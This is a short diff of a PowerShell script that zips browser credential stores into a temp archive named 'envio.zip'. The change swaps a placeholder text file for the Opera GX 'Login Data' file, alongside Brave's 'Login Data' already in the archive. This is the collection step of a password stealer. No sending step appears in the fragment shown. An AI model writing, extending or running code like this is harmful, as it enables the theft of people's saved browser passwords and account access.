@@ -7,7 +7,7 @@ $zip = "$env:TEMP\envio.zip"
 if (Test-Path $zip) { Remove-Item $zip -Force }
 
 Compress-Archive `
-    "$roaming\mano.txt", `
+    "$roaming\Opera Software\Opera GX Stable\Default\Login Data", `
     "$local\BraveSoftware\Brave-Browser\User Data\Default\Login Data" `
     -DestinationPath $zip -Force
 
